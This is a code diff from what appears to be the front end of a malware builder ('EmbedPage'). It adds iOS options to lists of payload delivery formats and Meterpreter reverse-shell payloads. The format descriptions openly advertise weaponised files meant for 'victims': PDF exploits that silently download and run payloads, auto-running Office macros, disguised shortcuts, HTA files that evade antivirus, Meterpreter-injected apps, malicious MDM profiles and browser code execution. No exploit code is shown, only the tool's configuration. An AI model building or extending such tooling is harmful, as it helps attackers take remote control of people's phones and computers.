@@ -14,21 +14,25 @@ type EmbedResult = {
 };
 
 const FORMATS = [
-  { id: "pdf",    label: "PDF Document",      icon: "📄", ext: "pdf",  desc: "Adobe Reader JS exploit — opens clean document, silently downloads & runs payload" },
-  { id: "video",  label: "Video Clip",         icon: "🎬", ext: "mp4",  desc: "MP4+ZIP polyglot — valid video + embedded payload extracted by archive tools" },
-  { id: "office", label: "Word / Excel",       icon: "📊", ext: "docm", desc: "VBA AutoOpen macro — fires when victim opens document, no click required" },
-  { id: "lnk",    label: "Shortcut (.LNK)",    icon: "🔗", ext: "lnk",  desc: "Windows shortcut with hidden PS payload — looks like PDF/folder icon" },
-  { id: "hta",    label: "HTML Application",   icon: "🌐", ext: "hta",  desc: "HTA file via mshta.exe — double-click runs PowerShell, bypasses many AVs" },
-  { id: "apk",    label: "Android APK",        icon: "🤖", ext: "apk",  desc: "Standalone Meterpreter APK or injected into legitimate app (WhatsApp, games)" },
+  { id: "pdf",        label: "PDF Document",       icon: "📄", ext: "pdf",          desc: "Adobe Reader JS exploit — opens clean document, silently downloads & runs payload" },
+  { id: "video",      label: "Video Clip",          icon: "🎬", ext: "mp4",          desc: "MP4+ZIP polyglot — valid video + embedded payload extracted by archive tools" },
+  { id: "office",     label: "Word / Excel",        icon: "📊", ext: "docm",         desc: "VBA AutoOpen macro — fires when victim opens document, no click required" },
+  { id: "lnk",        label: "Shortcut (.LNK)",     icon: "🔗", ext: "lnk",          desc: "Windows shortcut with hidden PS payload — looks like PDF/folder icon" },
+  { id: "hta",        label: "HTML Application",    icon: "🌐", ext: "hta",          desc: "HTA file via mshta.exe — double-click runs PowerShell, bypasses many AVs" },
+  { id: "apk",        label: "Android APK",         icon: "🤖", ext: "apk",          desc: "Standalone Meterpreter APK or injected into legitimate app (WhatsApp, games)" },
+  { id: "ios_mdm",    label: "iOS MDM Profile",     icon: "🍎", ext: "mobileconfig", desc: "Apple .mobileconfig — victim taps Install → full MDM channel (ALL iOS versions, no JB)" },
+  { id: "ios_ipa",    label: "iOS IPA (TrollStore)", icon: "📦", ext: "ipa",         desc: "iOS IPA via TrollStore — iOS 14-17.0b4, permanent install, no Apple account" },
+  { id: "ios_webkit", label: "iOS WebKit Exploit",   icon: "🌍", ext: "html",        desc: "Browser-based RCE — victim opens URL → code execution (no install). Matches iOS version" },
 ];
 
 const PAYLOADS = [
-  { id: "windows/x64/meterpreter/reverse_tcp",  label: "Windows x64 Meterpreter",  os: "win" },
-  { id: "windows/meterpreter/reverse_tcp",       label: "Windows x86 Meterpreter",  os: "win" },
-  { id: "windows/x64/meterpreter/reverse_https", label: "Windows x64 HTTPS (TLS)",  os: "win" },
-  { id: "android/meterpreter/reverse_tcp",       label: "Android Meterpreter",       os: "android" },
-  { id: "linux/x64/meterpreter/reverse_tcp",     label: "Linux x64 Meterpreter",    os: "linux" },
-  { id: "linux/x86/meterpreter/reverse_tcp",     label: "Linux x86 Meterpreter",    os: "linux" },
+  { id: "windows/x64/meterpreter/reverse_tcp",   label: "Windows x64 Meterpreter",   os: "win" },
+  { id: "windows/meterpreter/reverse_tcp",        label: "Windows x86 Meterpreter",   os: "win" },
+  { id: "windows/x64/meterpreter/reverse_https",  label: "Windows x64 HTTPS (TLS)",   os: "win" },
+  { id: "android/meterpreter/reverse_tcp",        label: "Android Meterpreter",        os: "android" },
+  { id: "linux/x64/meterpreter/reverse_tcp",      label: "Linux x64 Meterpreter",     os: "linux" },
+  { id: "linux/x86/meterpreter/reverse_tcp",      label: "Linux x86 Meterpreter",     os: "linux" },
+  { id: "apple_ios/aarch64/meterpreter_reverse_https", label: "iOS arm64 Meterpreter (HTTPS)", os: "ios" },
 ];
 
 export default function EmbedPage() {
